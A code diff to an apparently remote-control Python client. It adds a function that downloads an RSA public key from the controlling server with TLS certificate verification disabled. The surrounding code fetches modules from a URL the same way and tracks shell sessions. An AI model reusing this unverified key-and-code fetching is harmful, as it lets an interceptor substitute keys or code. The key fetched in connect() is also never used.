@@ -25,6 +25,27 @@ from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_paddi
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 
+def get_public_key(url):
+    """
+    This function fetches the public RSA key from a URL that returns the PEM file.
+    The public key is used to encrypt the AES key for secure message transmission.
+    """
+    context = ssl._create_unverified_context()
+    with urlopen(url, context=context) as response:
+        key_bytes = response.read()  # Read the data as raw bytes
+
+    # Decode the byte data to a string and clean it up
+    key_str = key_bytes.decode('utf-8').strip()  # Decode to string and strip any excess whitespace or newlines
+
+    # Replace literal '\n' with actual line breaks
+    key_str = key_str.replace(r'\n', '\n')  # Ensure that literal '\n' is converted to actual newline characters
+
+    # Convert the cleaned-up string back to bytes
+    clean_key_bytes = key_str.encode('utf-8')  # Re-encode the cleaned string to bytes
+
+    # Return the loaded RSA public key
+    return serialization.load_pem_public_key(clean_key_bytes)
+
 def encrypt(public_key, message):
     """
     Encrypt a message using AES encryption. The AES key is then encrypted with RSA for transmission.
@@ -77,7 +98,9 @@ shells = {}
 
 INACTIVITY_TIMEOUT = 30 * 60  # 30 minutes timeout in seconds
 
-def run(data, public_key):
+def run(data):
+    public_key = get_public_key(data['url']+"key")
+
     def create_module(url):
         # Create an SSL context that doesn't verify certificates
         context = ssl._create_unverified_context()
@@ -214,6 +237,8 @@ def run(data, public_key):
     def connect():
         sio.emit("mConnect", data)
         # Start a new thread to run the emit_screen_count function
+        public_key = get_public_key(data['url']+"key")
+
         threading.Thread(target=emit_screen_count, args=(data,)).start()
         print(sio.sid)
         print(data["uid"])
